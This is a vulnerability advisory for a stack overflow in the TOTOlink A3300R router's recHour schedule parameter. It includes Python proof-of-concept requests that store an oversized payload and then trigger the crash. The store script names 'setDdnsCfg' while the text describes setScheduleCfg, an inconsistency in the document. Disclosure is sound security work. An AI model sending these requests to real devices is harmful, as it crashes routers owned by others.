## Summary

A stack overflow vulnerability exists in the TOTOlink A3300R firmware. The `recHour` POST parameter accepted by `setScheduleCfg` function is written to the configuration key `recHour` via `Uci_Set_Str` without length or content validation. The stored value is later read via `getScheduleCfg `function and stored on the stack. Since there is no limit on the length of the stored value, it can lead to stack overflow.

## Affected product & version

- Device: TOTOlink A3300R
- Firmware Version: V17.0.0cu.557_B20221024
- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

## Vulnerability type

- **Type**:Stack overflow
- **Root cause:** Missing input validation / insufficient sanitization and lack of length checks in `Uci_Set_Str` and `Uci_Get_Str` functions that handle `recHour`.

## Vulnerability details

The `setScheduleCfg` endpoint accepts a POST parameter `recHour` and calls `Uci_Set_Str(11, "rebootsch", "recHour", v5)` without enforcing a maximum length.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_120741.png)

The `getScheduleCfg` endpoint retrieves the `recHour` parameter using `Uci_Get_Str(11, "rebootsch", "recHour", v13)` and stores it on the stack without proper boundary checks, which may result in a stack overflow vulnerability.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_121155.png)

## POC

1. **Store `recHour` **

```python
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
payload = b"a"*0x1000
data = {"topicurl":"setDdnsCfg","mode":"1","week":"1","hour":"11","minute":"11","recHour":payload}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
```

2. **Trigger**

```python
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"topicurl":"getScheduleCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
```

3. **result**

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_114256.png)